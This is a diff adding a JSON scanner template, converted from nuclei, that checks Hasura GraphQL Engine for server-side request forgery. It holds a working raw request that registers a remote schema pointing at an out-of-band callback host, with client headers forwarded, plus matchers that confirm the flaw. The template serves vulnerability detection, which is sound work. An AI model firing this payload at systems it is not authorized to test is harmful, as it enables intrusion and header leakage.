@@ -1,0 +1,135 @@
+{
+  "id": "hasura-graphql-ssrf",
+  "name": "Hasura GraphQL Engine - Server Side Request Forgery",
+  "author": "princechaddha",
+  "severity": "HIGH",
+  "description": "Hasura GraphQL Engine is vulnerable to SSRF( Server Side Request Forgery )",
+  "references": [
+    "https://cxsecurity.com/issue/WLB-2021040115"
+  ],
+  "tags": [
+    "hasura",
+    "ssrf",
+    "graphql"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /v1/query HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept: */*\n\n{\n   \"type\":\"bulk\",\n   \"args\":[\n      {\n         \"type\":\"add_remote_schema\",\n         \"args\":{\n            \"name\":\"test\",\n            \"definition\":{\n               \"url\":\"https://{{interactsh-url}}\",\n               \"headers\":[\n               ],\n               \"timeout_seconds\":60,\n               \"forward_client_headers\":true\n            }\n         }\n      }\n   ]\n}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "400"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "interactsh_protocol",
+          "values": [
+            "http"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "hasura-graphql-ssrf",
+    "info": {
+      "name": "Hasura GraphQL Engine - Server Side Request Forgery",
+      "author": "princechaddha",
+      "severity": "high",
+      "description": "Hasura GraphQL Engine is vulnerable to SSRF( Server Side Request Forgery )",
+      "reference": [
+        "https://cxsecurity.com/issue/WLB-2021040115"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "hasura,ssrf,graphql"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /v1/query HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept: */*\n\n{\n   \"type\":\"bulk\",\n   \"args\":[\n      {\n         \"type\":\"add_remote_schema\",\n         \"args\":{\n            \"name\":\"test\",\n            \"definition\":{\n               \"url\":\"https://{{interactsh-url}}\",\n               \"headers\":[\n               ],\n               \"timeout_seconds\":60,\n               \"forward_client_headers\":true\n            }\n         }\n      }\n   ]\n}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              400
+            ]
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "interactsh_protocol",
+            "words": [
+              "http"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
